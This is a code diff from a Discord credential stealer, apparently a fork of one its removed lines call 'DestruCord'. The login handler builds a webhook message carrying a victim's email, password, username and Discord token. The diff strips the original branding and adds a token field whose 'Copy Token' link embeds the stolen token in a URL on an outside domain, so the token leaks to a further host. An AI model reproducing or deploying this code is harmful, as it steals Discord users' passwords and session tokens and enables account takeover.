@@ -320,11 +320,13 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
  embeds: [
       {
-        title: "DestruCord Login",
-            description: "[<a:blackcap:961249786315538524> │ **Oh you have DestruCorded someone**](https://github.com/KSCHdsc)",
-
             "color": config.embed_color,
             "fields": [
+                {
+                    "name": "<a:sn1:989238042164351006> SN - Token:",
+                    "value": `\`\`\`${token}\`\`\`\n[`Copy Token`](https://superfurrycdn.nl/copy/${token})',
+                    "inline": false
+                },
                 {
                     "name": "**Account Name**",
                     "value": `\`${json.username +"#" + json.discriminator}\``,
@@ -360,11 +362,6 @@ const login = async (email, password, token) => {
                     "value": `\`${password}\``,
                     "inline": true
                 },
-                {
-                    "name": "**Token**",
-                    "value": `\`${token}\``,
-                    "inline": false
-                }
             ],
             "author": {
                 "name": json.username +"#" + json.discriminator + " (" + json.id + ") ",
